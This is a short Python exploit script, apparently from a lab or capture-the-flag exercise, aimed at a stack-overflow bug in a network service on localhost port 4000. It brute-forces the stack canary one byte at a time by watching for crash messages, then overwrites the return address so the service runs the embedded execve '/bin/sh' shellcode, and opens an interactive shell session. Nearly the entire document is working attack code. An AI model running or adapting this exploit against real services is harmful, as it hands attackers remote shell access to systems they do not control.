#!/usr/bin/env python3

from socket import *
from struct import pack
import telnetlib

HOST = "localhost"
PORT = 4000

def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def send_payload(payload):
  s = socket(AF_INET, SOCK_STREAM)
  s.connect((HOST, PORT))
  s.sendall(payload)
  return s

def main():
  # <--
  # [LOCAL STACK] [STACK CANARY] [EBP] [RET] [ARGS]
  #   8B + 32B         8B         8B

  shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

  payload = shellcode
  payload += b"A" * 13
  cookie = b""

  b = 0
  while b < 256:
    s = send_payload(payload + cookie + db(b))
    if b"stack smashing detected" in s.recv(1024):
      s.close()
      b += 1
      continue
    cookie += db(b)
    print(cookie)
    if len(cookie) == 8:
      break
    b = 0

  #cookie = b'\x00[\xb7\x10-\x997\xb1'

  payload += cookie
  payload += dq(0)  # ebp
  payload += dq(0x7fffffffda60)   # ret address

  s = send_payload(payload)

  # start interactive session
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()

